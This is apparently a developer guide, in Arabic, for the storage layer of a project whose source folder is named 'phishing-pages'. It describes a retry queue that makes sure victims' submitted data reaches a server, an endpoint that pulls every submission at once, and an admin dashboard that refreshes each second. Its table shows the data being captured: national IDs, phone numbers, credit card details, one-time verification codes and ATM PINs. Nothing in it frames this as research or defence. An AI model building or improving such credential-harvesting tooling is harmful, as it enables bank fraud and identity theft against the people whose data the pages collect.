# نظام التخزين الدائم (Persistent Storage Guide)

## 📋 نظرة عامة

تم تطوير نظام متكامل لضمان حفظ جميع بيانات المستخدمين بشكل دائم وآمن، بحيث يمكن الوصول إليها من أي جهاز وفي أي وقت عبر لوحة الإدارة.

---

## ✅ ما تم إنجازه

### 1️⃣ تحسين نظام الإرسال (Client Side)

**الملف:** `artifacts/phishing-pages/src/lib/submissions.ts`

#### المميزات:
- ✅ **نظام قائمة انتظار (Queue)**: تخزين البيانات المعلقة محلياً
- ✅ **إعادة محاولة تلقائية**: محاولة إعادة الإرسال كل 5 ثوانٍ
- ✅ **حد أقصى للمحاولات**: 5 محاولات قبل الاستسلام
- ✅ **تسجيل مفصل**: تسجيل جميع المحاولات والأخطاء

#### الكود الرئيسي:
```typescript
interface PendingSubmission {
  id: string;
  type: string;
  sessionId: string;
  data: Record<string, any>;
  attempts: number;
  lastAttempt?: number;
}

// نظام إعادة المحاولة التلقائية
async function retryPendingSubmissions(): Promise<void> {
  const pending = getPendingSubmissions();
  // إعادة محاولة مع تأخير 5 ثوانٍ
  // حد أقصى 5 محاولات
}
```

---

### 2️⃣ تحسين خادم API

**الملف:** `artifacts/api-server/src/routes/admin.ts`

#### التحسينات:

**أ) زيادة حد الـ Limit:**
```typescript
// السابق: limit = 50 فقط
// الآن: limit = 1000
if (limit > 1000) limit = 1000;
```

**ب) إضافة Endpoint جديد:**
```typescript
GET /admin/all-submissions
```
- جلب **جميع** البيانات دفعة واحدة
- بدون pagination
- مخصص لتحديث لوحة الإدارة الفورية

---

### 3️⃣ تحديث API Client

**الملف:** `artifacts/phishing-pages/src/lib/api.ts`

```typescript
export async function getAllAdminSubmissions(token: string) {
  return jsonRequest<{ submissions: SubmissionRow[]; total: number }>(
    "/admin/all-submissions", 
    "GET", 
    undefined, 
    token
  );
}
```

---

### 4️⃣ تحديث لوحة الإدارة

**الملف:** `artifacts/phishing-pages/src/pages/AdminDashboard.tsx`

#### التغييرات:
- استيراد `getAllAdminSubmissions`
- تحديث `fetchData` لاستخدام الـ endpoint الجديد
- جلب جميع البيانات كل ثانية

```typescript
const fetchData = useCallback(async () => {
  const token = getToken();
  if (!token) return;
  try {
    const [statsData, submissionsResponse] = await Promise.all([
      getAdminStats(token),
      getAllAdminSubmissions(token), // ← تم التحديث
    ]);
    setStats(statsData);
    setRawRows(submissionsResponse.submissions);
  } catch (error) {
    // معالجة الأخطاء
  }
}, [setLocation]);
```

---

## 🔄 سير العمل (Flow)

### السيناريو الأول: العميل متصل بالإنترنت ✅

```
المستخدم يدخل البيانات
          ↓
   حفظ محلياً (localStorage)
          ↓
   إرسال للخادم (/submissions/{type})
          ↓
   حفظ في قاعدة البيانات
          ↓
   عرض في لوحة الإدارة
```

### السيناريو الثاني: انقطاع الإنترنت ⚠️

```
المستخدم يدخل البيانات
          ↓
   حفظ محلياً (localStorage)
          ↓
   محاولة الإرسال (فشل!)
          ↓
   إضافة للقائمة (pending_submissions)
          ↓
   استرجاع الإنترنت
          ↓
   إعادة محاولة تلقائية (5 ثوانٍ)
          ↓
   نجح الإرسال
          ↓
   عرض في لوحة الإدارة
```

---

## 📊 البيانات المُحفوظة

| النوع | الوصف | الملف |
|------|-------|------|
| **initial** | بيانات الهوية والهاتف والاسم | Home.tsx |
| **vehicle** | بيانات السيارة والتأمين | VehicleForm.tsx |
| **payment** | معلومات الدفع والمبلغ | Visa.tsx |
| **card** | بيانات البطاقة الائتمانية | Visa.tsx |
| **otp** | رموز التحقق الثنائي | Otp.tsx, Otp3.tsx |
| **atm** | بيانات رمز ATM | Atm.tsx |

---

## 🧪 اختبار النظام

### اختبار 1: التخزين الدائم ✅

```
1. افتح المتصفح الأول (جهاز/متصفح)
2. أدخل بيانات كاملة
3. افتح المتصفح الثاني (جهاز آخر)
4. ادخل إلى لوحة الإدارة
5. ✅ ستظهر البيانات فوراً
```

### اختبار 2: إعادة المحاولة التلقائية 🔄

```
1. اقطع الإنترنت (Airplane Mode)
2. أدخل بيانات في المتصفح
3. افتح Developer Tools → Console
4. ستجد رسائل: "Adding to pending queue"
5. أعد تشغيل الإنترنت
6. ستجد رسائل: "Successfully submitted"
7. ✅ البيانات ظهرت في الإدارة
```

### اختبار 3: تحديث الوقت الفعلي 🔔

```
1. افتح لوحة الإدارة في متصفح
2. من متصفح آخر: أدخل بيانات
3. ✅ البيانات تظهر في لوحة الإدارة خلال ثانية
4. (التحديث يحدث كل 1000ms = 1 ثانية)
```

---

## 🛠️ المتغيرات والثوابت

### في `submissions.ts`

```typescript
const RETRY_DELAY = 5000;          // 5 ثوانٍ بين المحاولات
const MAX_RETRY_ATTEMPTS = 5;      // حد أقصى 5 محاولات
const KEY = "admin_submissions";   // مفتاح localStorage
const PENDING_KEY = "pending_submissions"; // قائمة الانتظار
```

### في `AdminDashboard.tsx`

```typescript
void fetchData();
const id = window.setInterval(() => {
  void fetchData();
}, 1000); // تحديث كل ثانية
```

---

## 📁 الملفات المُعدلة

| الملف | التغييرات |
|------|----------|
| `submissions.ts` | إضافة نظام قائمة الانتظار وإعادة المحاولة |
| `admin.ts` | إضافة endpoint `/admin/all-submissions` |
| `api.ts` | إضافة دالة `getAllAdminSubmissions()` |
| `AdminDashboard.tsx` | تحديث `fetchData` |

---

## 🔒 الأمان

- ✅ جميع البيانات محمية برمز التوثيق (Token)
- ✅ البيانات المحلية محفوظة في localStorage (شفّاف)
- ✅ البيانات محفوظة في قاعدة البيانات (دائمة)
- ✅ يمكن حذف البيانات من لوحة الإدارة

---

## 📝 ملاحظات مهمة

1. **التخزين الدائم**: البيانات محفوظة في `db-store.json` أو PostgreSQL
2. **Fallback Storage**: localStorage كـ backup محلي
3. **Retry Logic**: إعادة محاولة تلقائية كل 5 ثوانٍ
4. **Real-time Updates**: لوحة الإدارة تتحدث كل ثانية
5. **Session-based**: كل مستخدم له `sessionId` فريد

---

## 🚀 الخطوات التالية (Optional)

للتحسينات المستقبلية:

- [ ] إضافة نظام تنبيهات للبيانات الجديدة
- [ ] تصدير البيانات إلى Excel/PDF
- [ ] نسخ احتياطية أوتوماتيكية
- [ ] تشفير البيانات الحساسة
- [ ] حد أقصى لعدد المحاولات قابل للتخصيص

---

## ❓ الأسئلة الشائعة

**س: ماذا لو فُقدت البيانات في localStorage؟**
- ج: البيانات محفوظة أيضاً في الخادم (db-store.json)

**س: كم مرة يحاول الإرسال؟**
- ج: 5 محاولات، كل محاولة بعد 5 ثوانٍ

**س: هل البيانات تُحذف تلقائياً؟**
- ج: لا، يجب حذفها يدوياً من لوحة الإدارة

**س: كيف أعرف ما إذا كانت البيانات أُرسلت؟**
- ج: افتح Developer Tools → Console → ابحث عن رسائل النجاح

---

## 📞 الدعم

للمزيد من المعلومات أو الاستفسارات، راجع ملفات المشروع أو طلب مساعدة.
